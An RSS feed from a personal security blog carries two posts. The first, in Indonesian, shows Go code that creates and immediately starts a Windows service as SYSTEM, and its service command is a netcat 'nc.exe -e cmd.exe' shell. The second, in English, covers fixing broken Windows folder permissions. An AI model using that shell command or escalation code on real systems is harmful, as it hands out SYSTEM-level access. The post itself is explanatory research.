<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Blog on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/blog/</link>
    <description>Recent content in Blog on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 24 May 2021 19:58:39 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/blog/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Windows Services: Start a Service During Its Creation</title>
      <link>https://fahmifj.github.io/blog/start-a-windows-service-during-its-creation/</link>
      <pubDate>Thu, 12 Aug 2021 22:04:18 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/start-a-windows-service-during-its-creation/</guid>
      <description>Eksplorasi Windows Service</description>
      <content:encoded><![CDATA[<p>Tahun lalu (ternyata udah setahun), saya sempat baca dua buah postingan blog yang membahas soal Windows Service (selanjutkan akan disebut service). Post pertama merupakan bagian dari seri &ldquo;beyond root&rdquo;-nya <a href="https://twitter.com/0xdf_">0xdf</a>, bisa dibaca <a href="https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html#reverse-powershell">disini</a>. Sedangkan post kedua adalah post dari <a href="https://twitter.com/VbScrub">VbScrub</a>, bisa di baca <a href="https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/">disini</a>. Di post pertama, sebenarnya 0xdf <em>ngulik</em> soal psexec-nya Impacket, tapi masih terkait dengan Service. Hubungan post pertama dengan post kedua adalah si VbScrub melanjutkan <em>kulikan</em>-nya 0xdf dan membahas lebih detail tentang Service-nya.</p>
<p>Berkat kedua postingan tersebut, jadi mulai lihat-lihat dokumentasi API Windows tentang Service.</p>
<blockquote>
<p>*Ngulik itu sebangsa ngoprek 😅</p>
</blockquote>
<p>Pada Windows, Service sendiri adalah sebutan suatu program yang berjalan di belakang layar. Untuk Linux/Unix-like, sebutannya adalah Daemon. Contohnya: Windows Update, Firewall, Audio processing seperti Realtek misalnya, dll.</p>
<p><div class="img-container"><img src="imgs/image-20210812024145951.png" alt="image-20210812024145951"  /></div>
</p>
<h2 id="creation-of-a-service">Creation of a Service</h2>
<p>Sebelum melanjutkan tentang kedua postingan tadi, ada baiknya kita tahu dulu cara membuat sebuah service dan bagaimana prosesnya di belakang layar.</p>
<p>Windows menyediakan sebuah command-line utility bernama <code>sc.exe</code> untuk mengelola hal-hal terkait Service. Kita bisa menggunakan utility tersebut untuk membuat sebuah Service, misalnya:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ sc.exe create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\program.exe&#34;</span>
</code></pre></div><ul>
<li>MyService = Nama service</li>
<li>binPath = Lokasi executable program (+ argument)</li>
</ul>
<p>Kedua argumen diatas wajib disuplai.</p>
<p>Pembuatan service akan berhasil jika perintah tersebut diketikkan pada elevated (admin) terminal (cmd), atau si user memiliki hak CreateService (diizinkan untuk membuat service).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
<span class="o">[</span>SC<span class="o">]</span> CreateService SUCCESS
</code></pre></div><p>Jika bukan elevated atau tanpa hak untuk membuat service, maka hasilnya:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc.exe create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
<span class="o">[</span>SC<span class="o">]</span> OpenSCManager FAILED 5:

Access is denied.
</code></pre></div><p>Sedangkan, untuk mengetahui proses pembuatan/instalasi sebuah service dibelakang layar, kita bisa mengacu ke kode dalam bahasa C pada <a href="https://docs.microsoft.com/en-us/windows/win32/services/installing-a-service">dokumentasi Microsoft</a> berikut.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">VOID</span> <span class="nf">SvcInstall</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">SC_HANDLE</span> <span class="n">schSCManager</span><span class="p">;</span>
    <span class="n">SC_HANDLE</span> <span class="n">schService</span><span class="p">;</span>
    <span class="n">TCHAR</span> <span class="n">szPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>

    <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="n">GetModuleFileName</span><span class="p">(</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="n">szPath</span><span class="p">,</span> <span class="n">MAX_PATH</span> <span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Cannot install service (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    
     <span class="c1">// Creation of a Service: STEP 1
</span><span class="c1"></span>    <span class="c1">// Get a handle to the SCM database.
</span><span class="c1"></span>    <span class="n">schSCManager</span> <span class="o">=</span> <span class="n">OpenSCManager</span><span class="p">(</span>
        <span class="nb">NULL</span><span class="p">,</span>                    <span class="c1">// local computer
</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                    <span class="c1">// ServicesActive database
</span><span class="c1"></span>        <span class="n">SC_MANAGER_ALL_ACCESS</span><span class="p">);</span>  <span class="c1">// full access rights
</span><span class="c1"></span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="n">schSCManager</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;OpenSCManager failed (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
     <span class="c1">// Creation of a Service: STEP 2
</span><span class="c1"></span>    <span class="c1">// Create the service
</span><span class="c1"></span>    <span class="n">schService</span> <span class="o">=</span> <span class="n">CreateService</span><span class="p">(</span>
        <span class="n">schSCManager</span><span class="p">,</span>              <span class="c1">// SCM database
</span><span class="c1"></span>        <span class="n">SVCNAME</span><span class="p">,</span>                   <span class="c1">// name of service
</span><span class="c1"></span>        <span class="n">SVCNAME</span><span class="p">,</span>                   <span class="c1">// service name to display
</span><span class="c1"></span>        <span class="n">SERVICE_ALL_ACCESS</span><span class="p">,</span>        <span class="c1">// desired access
</span><span class="c1"></span>        <span class="n">SERVICE_WIN32_OWN_PROCESS</span><span class="p">,</span> <span class="c1">// service type
</span><span class="c1"></span>        <span class="n">SERVICE_DEMAND_START</span><span class="p">,</span>      <span class="c1">// start type
</span><span class="c1"></span>        <span class="n">SERVICE_ERROR_NORMAL</span><span class="p">,</span>      <span class="c1">// error control type
</span><span class="c1"></span>        <span class="n">szPath</span><span class="p">,</span>                    <span class="c1">// path to service&#39;s binary
</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no load ordering group
</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no tag identifier
</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no dependencies
</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// LocalSystem account
</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">);</span>                     <span class="c1">// no password
</span><span class="c1"></span>
    <span class="k">if</span> <span class="p">(</span><span class="n">schService</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;CreateService failed (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">schSCManager</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Service installed successfully</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="c1">// Creation of a Service: STEP 3
</span><span class="c1"></span>    <span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">schService</span><span class="p">);</span>
    <span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">schSCManager</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Secara garis besar, proses pembuatan service adalah seperti berikut:</p>
<ol>
<li>Program membuat koneksi ke Service Control Manager (SCM) dengan memanggil fungsi <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw">OpenSCManager</a>. Fungsi ini mengembalikan (return value) sesuatu yang disebut <strong>handle</strong> (selanjutnya kita sebut <a href="https://docs.microsoft.com/en-us/windows/win32/services/scm-handles">handle SCM</a>) dengan level akses tertentu, detailnya bisa dilihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access-rights-for-the-service-control-manager">disini</a>.</li>
<li>Handle SCM bersama dengan argumen lain seperti &ldquo;nama service&rdquo; dan &ldquo;binPath&rdquo; akan disuplai ke fungsi  <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew">CreateService</a> untuk membuat service. Fungsi <code>CreateService</code> ini punya nilai kembali berupa <strong>handle</strong> (kita sebut handle SVC) dengan level akses tertentu juga, detailnya bisa dilihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access-rights-for-a-service">disini</a>.</li>
<li>Di tahap ini, pesan sukses ditampilkan, lalu handle SCM dan handle SVC <u>ditutup</u> dan program keluar.</li>
</ol>
<p>Berdasarkan dokumentasi, akses handle SCM adalah SC_MANAGER_ALL_ACCESS (perlu elevated process). Dan untuk user dengan hak CreateService, akses handlenya adalah SC_MANAGER_CREATE_SERVICE.</p>
<h2 id="service-control">Service Control</h2>
<p>Service yang berhasil dibuat oleh user dalam mode elevated atau user dengan hak CreateService tidak akan bisa dikontrol (start, stop) oleh normal user karena ya secara default, normal user <strong>tidak punya akses</strong> untuk itu.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc start myService
<span class="o">[</span>SC<span class="o">]</span> StartService: OpenService FAILED 5:

Access is denied.
</code></pre></div><p>Pada saat menjalankan sebuah service seperti diatas, prosesnya secara garis besar adalah seperti berikut:</p>
<ol>
<li>Membuat koneksi ke SCM database dan mendapatkan handle SCM dengan level akses tertentu</li>
<li>Handle SCM kemudian disuplai ke fungsi <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicew">OpenService</a>. Fungsi ini mengembalikan handle SVC dengan level akses tertentu.</li>
<li>Handle SVC lalu disuplai ke <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew">StartService</a> untuk mulai menjalankan service.</li>
</ol>
<p>Dari ketiga tahap proses menjalankan service tersebut, normal user akan mendapatkan galat berupa &ldquo;Access is denied&rdquo; pada tahap 2 karena tidak handle SVC tidak didapatkan dan handle SCMnya hanya sebatas level user.</p>
<h4 id="start-a-service-using-createservice-service-handle">Start a Service using CreateService Service Handle</h4>
<p>Kalau kita lihat kembali ke proses pembuatan service, tepatnya pada tahap 2 fungsi CreateSevice dipanggil, si pembuat (level admin atau user dengan hak CreateService) service bisa <strong>menentukan level akses</strong> dirinya terhadap service yang dibuat dan handle SVC yang dikembalikan oleh fungsi tersebut memiliki level akses yang sama.</p>
<p>Jadi, jika saat pembuatan service A, level akses yang disuplai adalah SERVICE_ALL_ACCESS (full kontrol), maka handle SVC A pun akan memiliki level akses yang sama terhadap Service A, yaitu full kontrol. Tapi, di proses selanjutnya handle SVC ini ditutup.</p>
<p>Lalu, kira-kira apa jadinya jika handle SVC A tersebut tidak ditutup seperti seharusnya, melainkan dilanjut dan disuplai ke fungsi <code>StartService</code>? Hal inilah yang dilakukan oleh 0xdf dan VbScrub!</p>
<p>VbScrub juga menuliskan sebuah code untuk mendemonstrasikan temuannya <a href="https://github.com/VbScrub/ServiceInstallerTest">disini</a> sedangkan berikut adalah code yang saya tulis dalam bahasa Go.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="s">&#34;golang.org/x/sys/windows&#34;</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="c1">// Creation of a Service: STEP 1
</span><span class="c1"></span>	<span class="c1">// Connect to scm to get a handle to create a service
</span><span class="c1"></span>	<span class="nx">scmHandle</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">OpenSCManager</span><span class="p">(</span><span class="kc">nil</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">windows</span><span class="p">.</span><span class="nx">SC_MANAGER_CREATE_SERVICE</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;Error cannot create a service&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="c1">// define service
</span><span class="c1"></span>	<span class="nx">serviceName</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">UTF16PtrFromString</span><span class="p">(</span><span class="s">&#34;MyService&#34;</span><span class="p">)</span>
	<span class="nx">serviceExecPath</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">UTF16PtrFromString</span><span class="p">(</span><span class="s">`C:\myservice\nc.exe -e cmd.exe localhost 9000`</span><span class="p">)</span>

	<span class="c1">// Creation of a ervice: STEP 2
</span><span class="c1"></span>	<span class="c1">// Create a service
</span><span class="c1"></span>	<span class="nx">svcHandle</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">CreateService</span><span class="p">(</span>
		<span class="nx">scmHandle</span><span class="p">,</span>                         <span class="c1">// SCM database
</span><span class="c1"></span>		<span class="nx">serviceName</span><span class="p">,</span>                       <span class="c1">// name of service
</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// service name to display
</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_ALL_ACCESS</span><span class="p">,</span>        <span class="c1">// desired access
</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_WIN32_OWN_PROCESS</span><span class="p">,</span> <span class="c1">// service type
</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_DEMAND_START</span><span class="p">,</span>      <span class="c1">// start type
</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_ERROR_NORMAL</span><span class="p">,</span>      <span class="c1">// error control type
</span><span class="c1"></span>		<span class="nx">serviceExecPath</span><span class="p">,</span>                   <span class="c1">// path to service&#39;s binary
</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no load ordering group
</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no tag identifier
</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no dependencies
</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// LocalSystem account
</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no password
</span><span class="c1"></span>	<span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;err&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="c1">// Creation of a Service: STEP 3
</span><span class="c1"></span>	<span class="c1">// Don&#39;t close the svcHandle, instead send it to StartService
</span><span class="c1"></span>	<span class="k">if</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">StartService</span><span class="p">(</span><span class="nx">svcHandle</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kc">nil</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;Error Starting service&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	<span class="p">}</span>
    <span class="c1">// Creation of a Service: STEP 4
</span><span class="c1"></span>    <span class="c1">// Finally close the handles
</span><span class="c1"></span>    <span class="nx">windows</span><span class="p">.</span><span class="nf">CloseServiceHandle</span><span class="p">(</span><span class="nx">svcHandle</span><span class="p">)</span>
    <span class="nx">windows</span><span class="p">.</span><span class="nf">CloseHandle</span><span class="p">(</span><span class="nx">scmHandle</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div><p>Hasilnya?</p>
<p>SYSTEM!</p>
<p><div class="img-container"><img src="imgs/image-20210813011334034.png" alt="image-20210813011334034"  /></div>
</p>
<p>Programnya versi argumen, bisa di cek <a href="https://github.com/fahmifj/winapi-go">disini</a>.</p>
<p><em>Tapi, kenapa harus custom code?</em></p>
<p>Karena <code>sc.exe</code> sendiri tidak menyediakan opsi untuk meng-assign <code>SERVICE_ALL_ACCESS</code> pada service yang akan dibuat. Ditambah, setelah proses pembuatan service, handle-handlenya ditutup.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create
DESCRIPTION:
        Creates a service entry in the registry and Service Database.
USAGE:
        sc &lt;server&gt; create <span class="o">[</span>service name<span class="o">]</span> <span class="o">[</span><span class="nv">binPath</span><span class="o">=</span> <span class="o">]</span> &lt;option1&gt; &lt;option2&gt;...

OPTIONS:
NOTE: The option name includes the equal sign.
      A space is required between the equal sign and the value.
 <span class="nv">type</span><span class="o">=</span> &lt;own<span class="p">|</span>share<span class="p">|</span>interact<span class="p">|</span>kernel<span class="p">|</span>filesys<span class="p">|</span>rec<span class="p">|</span>userown<span class="p">|</span>usershare&gt;
       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> own<span class="o">)</span>
 <span class="nv">start</span><span class="o">=</span> &lt;boot<span class="p">|</span>system<span class="p">|</span>auto<span class="p">|</span>demand<span class="p">|</span>disabled<span class="p">|</span>delayed-auto&gt;
       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> demand<span class="o">)</span>
 <span class="nv">error</span><span class="o">=</span> &lt;normal<span class="p">|</span>severe<span class="p">|</span>critical<span class="p">|</span>ignore&gt;
       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> normal<span class="o">)</span>
 <span class="nv">binPath</span><span class="o">=</span> &lt;BinaryPathName to the .exe file&gt;
 <span class="nv">group</span><span class="o">=</span> &lt;LoadOrderGroup&gt;
 <span class="nv">tag</span><span class="o">=</span> &lt;yes<span class="p">|</span>no&gt;
 <span class="nv">depend</span><span class="o">=</span> &lt;Dependencies<span class="o">(</span>separated by / <span class="o">(</span>forward slash<span class="o">))</span>&gt;
 <span class="nv">obj</span><span class="o">=</span> &lt;AccountName<span class="p">|</span>ObjectName&gt;
       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> LocalSystem<span class="o">)</span>
 <span class="nv">DisplayName</span><span class="o">=</span> &lt;display name&gt;
 <span class="nv">password</span><span class="o">=</span> &lt;password&gt;
</code></pre></div><h4 id="jadi--">Jadi &hellip; ?</h4>
<p>Seperti di postnya, VbScrub bilang hal ini kemungkinan bukan security issue.</p>
<p>Tapi kalau balik lagi dan mengacu ke <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?">dokumentasi Microsoft</a>-nya, bisa disimpulkan secara gak langsung kalau user dengan hak CreateService masih termasuk admin.</p>
<p><div class="img-container"><img src="imgs/image-20210812194031337.png" alt="image-20210812194031337"  /></div>
</p>
<p>Intinya disini kita butuh hak CreateService (SC_MANAGER_CREATE_SERVICE) dan custom compiled program jika tidak mau menunggu reboot, karena pembuatan service menggunakan <code>sc.exe</code>  sudah pasti handle SVCnya ditutup. Jadi setidaknya, start up type si service harus di set ke <code>automatic on boot</code>.</p>
<p>Sekian~</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/">https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/</a></li>
<li><a href="https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html">https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights">https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/services/installing-a-service">https://docs.microsoft.com/en-us/windows/win32/services/installing-a-service</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/services/starting-a-service">https://docs.microsoft.com/en-us/windows/win32/services/starting-a-service</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Windows 10 Troubleshoot: Permissions</title>
      <link>https://fahmifj.github.io/blog/windows-10-troubleshoot-permissions/</link>
      <pubDate>Wed, 21 Jul 2021 07:07:50 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/windows-10-troubleshoot-permissions/</guid>
      <description>Facing weird error on Windows 10? Then maybe this post could help you</description>
      <content:encoded><![CDATA[<p>Yesterday, I wanted to upgrade my Microsoft Office, and then planned to clean up my Windows laptop from unused programs, particularly the ones installed by chocolatey (Windows package manager). But, you guess it, things don&rsquo;t always go as planned.</p>
<p>The first problem I encounter was <code>Error Code: 30015-4 (5)</code>, while trying to re-install my Microsoft Office, and then several  <code>C:\ProgramData\Microsoft\Windows GetLastError:5</code> error messages. These problems were related to Windows permissions, and I believe they were caused by a Microsoft troubleshooter tool called <a href="https://www.microsoft.com/en-us/download/100607">SaRA</a>. The tool might have accidentally messed up the Windows permissions during the process of cleaning up my previous Microsoft Office. As a result, my Windows no longer be able to install or remove some apps.</p>
<p>But, I was able to resolve these problems by manually resetting the permissions of the respective app folders back to their original state. So, I think it would be fun to post how I resolve them.</p>
<h2 id="the-problems">The Problems</h2>
<p>The first problem I ran into was <code>Error Code: 30015-4(5)</code> when I tried to reinstall my Microsoft Office.</p>
<p><div class="img-container"><img src="imgs/image-20210721040950497.png" alt="image-20210721040950497"  title="Error Code: 30015-4 (5)"  /></div>
</p>
<p>I clicked on the online help, and it was pointing out to <a href="https://support.microsoft.com/en-us/office/fix-office-installation-errors-d5df89a9-0507-4b4c-92f9-22f457e630aa?ns=ocsac2rinstall&amp;version=16&amp;syslcid=1033&amp;uilcid=1033&amp;appver=cin160&amp;helpid=%225-4-30015%22&amp;ui=en-us&amp;rs=en-us&amp;ad=us">this page</a>. At the bottom of the page, it offers an &ldquo;easy fix&rdquo; tool to resolve the problem above.</p>
<p><div class="img-container"><img src="imgs/image-20210721041358098.png" alt="image-20210721041358098"  title="An easy fix tool that resulted in another chaos"  /></div>
</p>
<p>I downloaded and ran that tool, but the error remains 🙃.</p>
<p>At this point, I couldn&rsquo;t install or uninstall any applications wrapped with Windows Installer (<code>.msi</code>) anymore, including NodeJS. It&rsquo;s the same problem as the one in my <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">PrintNightmare</a> post, in which my Visual Studio refuses to install the Windows SDK.</p>
<p><div class="img-container"><img src="./imgs/image-20210718024015408.png" alt="image-20210718024015408"  /></div>
</p>
<p>And somehow, this also affects my laptop&rsquo;s WiFi functionality/features, such as:</p>
<ul>
<li>Unable to save WiFi profiles, auto-connect no longer works.</li>
<li>Unable to turn on the mobile hotspot feature</li>
<li>The &ldquo;Forget&rdquo; and &ldquo;Properties&rdquo; options are missing when a right-click is performed on a WiFi connection.</li>
</ul>
<p>The most weird one is a stack-based buffer error came from my WiFi settings.</p>
<p><div class="img-container"><img src="imgs/image-20210721050915867.png" alt="image-20210721050915867"  title="Stack-based buffer error"  /></div>
</p>
<p>The error raises when I clicked any Wi-Fi connection that currently in use from the Wi-Fi settings.</p>
<p><div class="img-container"><img src="imgs/image-20210721053820002.png" alt="image-20210721053820002"  title="WiFi Settings"  /></div>
</p>
<p>Also, the &ldquo;Forget&rdquo; and &ldquo;Properties&rdquo; options were missing. I found the same issue <a href="https://answers.microsoft.com/en-us/windows/forum/all/windows-10-doesnt-save-wifi-network-resolved/16ae1129-e24b-4268-91c4-acc4446966fa">here</a> but the solution doesn&rsquo;t suite my environment.</p>
<p><div class="img-container"><img src="imgs/image-20210721054401662.png" alt="image-20210721054401662"  title="Missing the Forget and the Properties options"  /></div>
</p>
<h2 id="finding-the-root-cause">Finding The Root Cause</h2>
<p>Searching for <code>Error Code: 30015-4  (5)</code> on the Microsoft Support site didn&rsquo;t really help, so I started to search for the official documentation about error code, and I found <a href="https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-">this page</a>. I couldn&rsquo;t find anything about &ldquo;30015-4&rdquo; in that page, but I think I did know what &ldquo;(5)&rdquo; meant.</p>
<p><div class="img-container"><img src="imgs/image-20210721043547662.png" alt="image-20210721043547662"  /></div>
</p>
<p>At this point, it was clear that these problems were related to the system permissions (even my Wi-Fi problem).</p>
<p>I started to investigate <code>C:\Program Files\</code> and <code>C:\Program Files (x86)\</code> (the default folder for installed apps), but no problems were found there.  So the next one is <code>C:\ProgramData</code>, where all application data is stored/created.</p>
<p>While investigating all the folders under <code>C:\ProgramData\</code> and <code>C:\ProgramData\Microsoft</code>, I noticed that some of the folders only have my account listed in their security properties.</p>
<p><div class="img-container"><img src="imgs/image-20210721044802348.png" alt="image-20210721044802348"  title="Bad Permissions on Office folder"  /></div>
</p>
<p>Normally, the folder permissions under <code>C:\ProgramData</code> should be configured similar to the image below (taken from VirtualBox folder) .</p>
<p><div class="img-container"><img src="imgs/image-20210721045334784.png" alt="image-20210721045334784"  title="Good Permissions: Basic"  /></div>
</p>
<p>And here are the advanced permission settings.</p>
<p><div class="img-container"><img src="imgs/image-20210721045624596.png" alt="image-20210721045624596"  title="Good Permissions: Advanced Settings"  /></div>
</p>
<p>Now I know how the default permissions look like, and I can use this as a template to fix the other folders with bad permissions.</p>
<h2 id="fix-the-problems">Fix The Problems</h2>
<h3 id="office-error-code-30015-4-5">Office Error Code: 30015-4 (5)</h3>
<p>This error <code>Error Code: 30015-4 (5)</code> can be resolved by enabling the inheritance on the respective app folder, which is <code>C:\ProgramData\Microsoft\OFFICE</code>. So that the permissions of the  <code>Microsoft</code> folder will be inherited to the <code>OFFICE</code> folder. I will also remove my account, &ldquo;Fahmi FJ&rdquo;, from the permission entries.</p>
<p><div class="img-container"><img src="imgs/image-20210721051824838.png" alt="image-20210721051824838"  title="Fix Office Error Code: 30015-4(5)"  /></div>
</p>
<p>If you&rsquo;re not sure about this, do check the other folders' permissions under the same parent folder. Using this case, then the parent folder is <code>C:\ProgramData\Microsoft\</code>,  and the child are any folders under <code>C:\ProgramData\Microsoft\[child]</code>.</p>
<p>I got my Ms Office back now.</p>
<p><div class="img-container"><img src="imgs/image-20210721053920106.png" alt="image-20210721053920106"  /></div>
</p>
<h3 id="getlasterror5">GetLastError:5</h3>
<p>Any <code>GetLastError:5</code>, can be resolved using the same method as above, by enabling the inheritance to the affected application folder.</p>
<p>In my case, I got the following error message from chocolatey and node.js:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms GetLastError: <span class="m">5</span>
</code></pre></div><p>Then, first, I should look into the permissions of <code>Microsoft</code> folder, then <code>Windows</code> folder, and then <code>Start Menu</code> folder, and it turned out the problem is in the <code>Windows</code> folder permissions. So, to resolve this problem, I have to inherit the <code>Microsoft</code> folder permissions to the <code>Windows</code> folder, see image below.</p>
<p><div class="img-container"><img src="imgs/image-20210721114505028.png" alt="image-20210721114505028"  /></div>
</p>
<p>And then, I will revert the <code>Start Menu</code> folder permissions to default, see image below.</p>
<p><div class="img-container"><img src="imgs/image-20210721114911619.png" alt="image-20210721114911619"  /></div>
</p>
<p>Finally inherit the <code>Start Menu</code> folder permissions to the <code>Programs</code> folder.</p>
<p><div class="img-container"><img src="imgs/image-20210721115022365.png" alt="image-20210721115022365"  /></div>
</p>
